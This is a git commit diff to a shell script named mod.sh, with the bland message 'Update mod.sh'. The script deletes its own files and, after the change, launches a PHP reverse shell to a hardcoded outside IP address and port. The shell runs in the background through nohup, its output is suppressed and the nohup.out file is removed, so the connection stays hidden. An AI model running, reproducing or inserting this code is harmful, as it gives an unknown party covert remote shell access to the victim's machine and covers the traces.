58fa7c1f2d460b88f7ac436370d166c12f06934d
VISHNU PREMIL <82073583+strangedreamer4@users.noreply.github.com>
2023-12-21 13:45:05 +0530

    Update mod.sh

--- mod.sh
+++ mod.sh
@@ -5,8 +5,10 @@ sleep 1  # Wait for 1 second before the next command
 rm mod.py
 rm mod.sh
 sleep 1  # Wait for 1 second before the next command
-# Add PHP reverse shell command
-php -r '$sock=fsockopen("159.203.126.35",22289);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+# Add PHP reverse shell command with nohup
+nohup php -r '$sock=fsockopen("159.203.126.35",22289);exec("/bin/sh -i <&3 >&3 2>&3");' >/dev/null 2>&1 &
+sleep 1  # Wait for 1 second before the next command
 
-
+# Remove nohup output file
+rm nohup.out
